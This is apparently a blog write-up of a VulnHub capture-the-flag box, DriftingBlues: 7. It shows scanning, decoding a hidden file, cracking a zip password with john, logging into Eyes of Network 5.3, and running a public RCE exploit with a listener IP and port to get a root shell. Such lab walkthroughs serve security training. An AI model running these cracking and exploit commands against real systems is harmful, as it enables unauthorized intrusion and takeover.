---
title: "DriftingBlues: 7"
date: 07-29-2024
excerpt: VulnHub
cover: ../uploads/cover_driftingblues7.jpg
tags: eyesofnetwork, EON 5.3 RCE
---

Welcome back to another writeup! In this post, I’ll walk you through how I rooted the seventh box in the DriftingBlues series. We’re getting closer to the final machine—let’s dive in!

The first step, as usual, is running an `Nmap` scan to identify any open ports that might serve as our initial access point.

```shell
nmap -A -T5 192.168.172.110
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2Vw0Bny4FgCFw8TJhauM%252FScreenshot%2520%281781%29.png%3Falt%3Dmedia%26token%3D23df04bf-251f-4f1c-bbb9-4fcc18c1dacf&width=768&dpr=3&quality=100&sign=a1b97f0&sv=2)

Port 22 (ssh), Port 66 (http), Port 80 (http), Port 111 (rpcbind), Port 443 (https), port 2403, port 3306 (MySQL), Port 8086 (http)

There are several ports running HTTP services, which means plenty of possibilities to explore. The next step is to check out the webpage. Since HTTPS is available, it should automatically redirect us to the secure version instead of HTTP.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F7JCtcNs1nZK2VMHJH51R%252FScreenshot%2520%281783%29.png%3Falt%3Dmedia%26token%3Da29c1fd6-83f8-4a4d-87fa-99b5911ba5c0&width=768&dpr=3&quality=100&sign=6e6a7853&sv=2)

It's Eyes of Network! I have a good feeling about this, if the version of this is 5.3, it's an instant RCE.

**What is Eyes Of Network?**

Eyes of Network (EON) is an open-source IT infrastructure monitoring and management tool that combines several powerful tools like Nagios, Centreon, and Nagvis into a single platform. Designed for system and network administrators, EON provides real-time monitoring, performance graphs, alerting, and visualization of networks and servers, allowing users to detect issues quickly and maintain system uptime. It offers a web-based interface for easy configuration and status overview, making it a comprehensive solution for supervising both small and large-scale IT environments.

Since we don't have any credentials at the moment, we'll set that aside for now and explore the other ports. Let's take a look at Port 66—it stands out as unusual to me.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F9IDwYosJBXdgiyOQgnUR%252FScreenshot%2520%281784%29.png%3Falt%3Dmedia%26token%3Db74edf8d-6546-495a-89c1-f4f2864fabcc&width=768&dpr=3&quality=100&sign=5f9b5b79&sv=2)

Clicking on each of the tabs at the top doesn’t trigger any redirection or changes—the page remains completely static.

This looks a bit suspicious, so I began enumerating subdirectories on this page. At the same time, I also started scanning for subdirectories on other HTTP services using `dirsearch`.

```shell
dirsearch -u http://192.168.172.110:66 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -e txt,php,html
```

After a while, a file was finally discovered on Port 66.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FfQtdYRIUrZzGRL9xcwuw%252FScreenshot%2520%281785%29.png%3Falt%3Dmedia%26token%3D8390d579-ff37-4194-ae22-8d7d850a1de6&width=768&dpr=3&quality=100&sign=c9fb7c13&sv=2)

A file named eon discovered, so the next thing I did is to get it.

```shell
wget http://192.168.172.110:66/eon
```

Then check its content.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FfMr6xMMIZIn7IA81UD22%252FScreenshot%2520%281787%29.png%3Falt%3Dmedia%26token%3D8b4e84c4-a66a-4759-a30d-b0ef3e4429a3&width=768&dpr=3&quality=100&sign=4fcf06fa&sv=2)

Looks Base64, now let's decode it.

```shell
echo "encoded_text" | base64 -d
```

This is the plaintext.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FsRirzcuop8yEy4kxL4Fx%252FScreenshot%2520%281788%29.png%3Falt%3Dmedia%26token%3Dd37f0a01-f572-4020-9334-c3db795fe5db&width=768&dpr=3&quality=100&sign=4f6c0a33&sv=2)

Aha! This appears to be a ZIP file—based on the initial bytes of its content, it starts with "PK", which is a well-known file signature (also called a magic number) for ZIP archives. This signature indicates that the file likely contains compressed data, and it's worth investigating further to see if it holds any useful information or credentials we can extract.

Next thing I did is to turn that Base64 encoded text to a file using [`Base64.guru`](https://base64.guru/converter/decode/file) .

Now that we have the ZIP file, let's unzip it.

```shell
unzip application.zip
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FA5YakbpZ1Y3dp4VtzWlm%252FScreenshot%2520%281790%29.png%3Falt%3Dmedia%26token%3Dd2393bac-9c1b-4319-9bc0-392c1a78c868&width=768&dpr=3&quality=100&sign=354ef1ed&sv=2)

It has a password, now let's crack it. Let's convert the zip file to a hash first.

```shell
zip2john application.zip > hash
```

Now let's crack it using `john`.

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

And..

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FG40xBsnVSDxciv6QzAKI%252FScreenshot%2520%281793%29.png%3Falt%3Dmedia%26token%3D09a8f1e8-b744-4fa6-8eeb-1afa21477c83&width=768&dpr=3&quality=100&sign=a9c1eca7&sv=2)

We now have the password, now let's unzip it again!

We've now successfully retrieved the `creds.txt` file.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJWpk3p1F2mqIpRKYcI69%252FScreenshot%2520%281794%29.png%3Falt%3Dmedia%26token%3D94d6feee-fdd1-41da-b98f-bfcf68f0cbd4&width=768&dpr=3&quality=100&sign=5d3d54d7&sv=2)

A username and a password. This might be the credential for the EON, let's try!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FZZzdP9us4CPqJaDO50n5%252FScreenshot%2520%281796%29.png%3Falt%3Dmedia%26token%3Db2ef86ee-b5d7-4393-b6c3-c65a5e5ad9ae&width=768&dpr=3&quality=100&sign=e65375c6&sv=2)

It worked—we’ve gained access! Now, let’s check what version of EON is this.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FwsYoGRk54qcB6XTfFBqW%252FScreenshot%2520%281798%29.png%3Falt%3Dmedia%26token%3D7898652b-7f47-49c7-a771-871f1f2af53c&width=768&dpr=3&quality=100&sign=927e221d&sv=2)

Just as I suspected—it’s version 5.3! This version is known to be vulnerable to Remote Code Execution (RCE)!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FLa7O62MLSyE9F76gZgxC%252FScreenshot%2520%281799%29.png%3Falt%3Dmedia%26token%3D87017b54-af3f-4ed1-a2a0-a90f831989aa&width=768&dpr=3&quality=100&sign=974ddcd4&sv=2)

As you can see, there's so many exploits available for this version, haha! But we’ll be using the last one!

```shell
searchsploit -m php/webapps/48025.txt
```

Now that we’ve obtained the exploit, we’ll convert it into a Python file, as it’s originally written in Python.

```shell
mv 48025.txt exploit.py
```

Now let's run the exploit!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUNxcmtETFk5Ed6NaEwDX%252FScreenshot%2520%281802%29.png%3Falt%3Dmedia%26token%3Dd4a7acb5-b789-46ad-95b9-ce01b2fbf33b&width=768&dpr=3&quality=100&sign=d982c387&sv=2)

We're all set!

```shell
python3 exploit.py https://192.168.172.110 -ip 192.168.172.246 -port 1234 -user admin -password <REDACTED>
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Frlys9pcWzLBC5TY5gZhx%252FScreenshot%2520%281804%29.png%3Falt%3Dmedia%26token%3D8fd35535-ca2b-41a7-8c9a-cc27bbef0db8&width=768&dpr=3&quality=100&sign=33fd9176&sv=2)

We’re in! And if you notice the shell prompt showing a hash symbol (#), that means we’ve already gained root access!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FkWnLrr1cotgsLzJTu9N5%252FScreenshot%2520%281809%29.png%3Falt%3Dmedia%26token%3Dfea74bd9-9661-4157-bcca-31c9a7707558&width=768&dpr=3&quality=100&sign=a3492ae4&sv=2)

Root Flag!

We've successfully pwned DriftingBlues: 7!!!

This box is really simple actually, nothing's new... Now time for the final box!! Stay tuned!!
